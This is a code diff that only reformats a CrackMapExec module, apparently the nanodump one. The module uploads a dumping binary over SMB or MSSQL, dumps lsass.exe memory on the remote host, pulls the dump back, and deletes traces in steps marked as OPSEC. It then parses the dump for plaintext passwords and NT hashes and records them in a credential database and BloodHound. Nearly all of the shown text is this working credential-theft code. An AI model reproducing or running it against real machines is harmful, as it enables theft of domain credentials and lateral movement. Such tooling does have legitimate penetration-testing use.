@@ -100,16 +100,10 @@ class CMEModule:
         if self.context.protocol == "smb":
             with open(self.nano_path + self.nano, "rb") as nano:
                 try:
-                    self.connection.conn.putFile(
-                        self.share, self.tmp_share + self.nano, nano.read
-                    )
-                    self.context.log.success(
-                        f"Created file {self.nano} on the \\\\{self.share}{self.tmp_share}"
-                    )
+                    self.connection.conn.putFile(self.share, self.tmp_share + self.nano, nano.read)
+                    self.context.log.success(f"Created file {self.nano} on the \\\\{self.share}{self.tmp_share}")
                 except Exception as e:
-                    self.context.log.fail(
-                        f"Error writing file to share {self.share}: {e}"
-                    )
+                    self.context.log.fail(f"Error writing file to share {self.share}: {e}")
         else:
             with open(self.nano_path + self.nano, "rb") as nano:
                 try:
@@ -117,18 +111,12 @@ class CMEModule:
                     exec_method = MSSQLEXEC(self.connection.conn)
                     exec_method.put_file(nano.read(), self.tmp_dir + self.nano)
                     if exec_method.file_exists(self.tmp_dir + self.nano):
-                        self.context.log.success(
-                            f"Created file {self.nano} on the remote machine {self.tmp_dir}"
-                        )
+                        self.context.log.success(f"Created file {self.nano} on the remote machine {self.tmp_dir}")
                     else:
-                        self.context.log.fail(
-                            "File does not exist on the remote system... error during upload"
-                        )
+                        self.context.log.fail("File does not exist on the remote system... error during upload")
                         sys.exit(1)
                 except Exception as e:
-                    self.context.log.fail(
-                        f"Error writing file to remote machine directory {self.tmp_dir}: {e}"
-                    )
+                    self.context.log.fail(f"Error writing file to remote machine directory {self.tmp_dir}: {e}")
 
         # apparently SMB exec methods treat the output parameter differently than MSSQL (we use it to display())
         # if we don't do this, then SMB doesn't actually return the results of commands, so it appears that the
@@ -178,45 +166,27 @@ class CMEModule:
             if self.context.protocol == "smb":
                 with open(filename, "wb+") as dump_file:
                     try:
-                        self.connection.conn.getFile(
-                            self.share, self.tmp_share + nano_log_name, dump_file.write
-                        )
-                        self.context.log.success(
-                            f"Dumpfile of lsass.exe was transferred to {filename}"
-                        )
+                        self.connection.conn.getFile(self.share, self.tmp_share + nano_log_name, dump_file.write)
+                        self.context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                     except Exception as e:
                         self.context.log.fail(f"Error while getting file: {e}")
 
                 try:
-                    self.connection.conn.deleteFile(
-                        self.share, self.tmp_share + self.nano
-                    )
-                    self.context.log.success(
-                        f"Deleted nano file on the {self.share} share"
-                    )
+                    self.connection.conn.deleteFile(self.share, self.tmp_share + self.nano)
+                    self.context.log.success(f"Deleted nano file on the {self.share} share")
                 except Exception as e:
-                    self.context.log.fail(
-                        f"Error deleting nano file on share {self.share}: {e}"
-                    )
+                    self.context.log.fail(f"Error deleting nano file on share {self.share}: {e}")
 
                 try:
-                    self.connection.conn.deleteFile(
-                        self.share, self.tmp_share + nano_log_name
-                    )
-                    self.context.log.success(
-                        f"Deleted lsass.dmp file on the {self.share} share"
-                    )
+                    self.connection.conn.deleteFile(self.share, self.tmp_share + nano_log_name)
+                    self.context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
                 except Exception as e:
-                    self.context.log.fail(
-                        f"Error deleting lsass.dmp file on share {self.share}: {e}"
-                    )
+                    self.context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
             else:
                 try:
                     exec_method = MSSQLEXEC(self.connection.conn)
                     exec_method.get_file(self.tmp_dir + nano_log_name, filename)
-                    self.context.log.success(
-                        f"Dumpfile of lsass.exe was transferred to {filename}"
-                    )
+                    self.context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                 except Exception as e:
                     self.context.log.fail(f"Error while getting file: {e}")
 
@@ -224,13 +194,9 @@ class CMEModule:
 
                 try:
                     self.connection.execute(f"del {self.tmp_dir + nano_log_name}")
-                    self.context.log.success(
-                        f"Deleted lsass.dmp file on the {self.tmp_dir} dir"
-                    )
+                    self.context.log.success(f"Deleted lsass.dmp file on the {self.tmp_dir} dir")
                 except Exception as e:
-                    self.context.log.fail(
-                        f"[OPSEC] Error deleting lsass.dmp file on dir {self.tmp_dir}: {e}"
-                    )
+                    self.context.log.fail(f"[OPSEC] Error deleting lsass.dmp file on dir {self.tmp_dir}: {e}")
 
             fh = open(filename, "r+b")
             fh.seek(0)
@@ -262,32 +228,22 @@ class CMEModule:
 
                     for luid in pypy_parse.logon_sessions:
                         for ssp in ssps:
-                            for cred in getattr(
-                                pypy_parse.logon_sessions[luid], ssp, []
-                            ):
+                            for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):
                                 domain = getattr(cred, "domainname", None)
                                 username = getattr(cred, "username", None)
                                 password = getattr(cred, "password", None)
                                 NThash = getattr(cred, "NThash", None)
                                 if NThash is not None:
                                     NThash = NThash.hex()
-                                if (
-                                    username
-                                    and (password or NThash)
-                                    and "$" not in username
-                                ):
+                                if username and (password or NThash) and "$" not in username:
                                     if password:
                                         credtype = "password"
                                         credential = password
                                     else:
                                         credtype = "hash"
                                         credential = NThash
-                                    self.context.log.highlight(
-                                        f"{domain}\\{username}:{credential}"
-                                    )
-                                    host_id = self.context.db.get_hosts(
-                                        self.connection.host
-                                    )[0][0]
+                                    self.context.log.highlight(f"{domain}\\{username}:{credential}")
+                                    host_id = self.context.db.get_hosts(self.connection.host)[0][0]
                                     self.context.db.add_credential(
                                         credtype,
                                         connection.domain,
@@ -295,11 +251,7 @@ class CMEModule:
                                         credential,
                                         pillaged_from=host_id,
                                     )
-                                    if (
-                                        "." not in domain
-                                        and domain.upper()
-                                        in self.connection.domain.upper()
-                                    ):
+                                    if "." not in domain and domain.upper() in self.connection.domain.upper():
                                         domain = self.connection.domain
                                         bh_creds.append(
                                             {
@@ -308,9 +260,7 @@ class CMEModule:
                                             }
                                         )
                     if len(bh_creds) > 0:
-                        add_user_bh(
-                            bh_creds, None, self.context.log, self.connection.config
-                        )
+                        add_user_bh(bh_creds, None, self.context.log, self.connection.config)
                 except Exception as e:
                     self.context.log.fail(f"Error opening dump file: {e}")
 
@@ -319,6 +269,4 @@ class CMEModule:
             self.connection.execute(f"del {self.tmp_dir + self.nano}")
             self.context.log.success(f"Deleted nano file on the {self.share} dir")
         except Exception as e:
-            self.context.log.fail(
-                f"[OPSEC] Error deleting nano file on dir {self.tmp_dir}: {e}"
-            )
+            self.context.log.fail(f"[OPSEC] Error deleting nano file on dir {self.tmp_dir}: {e}")
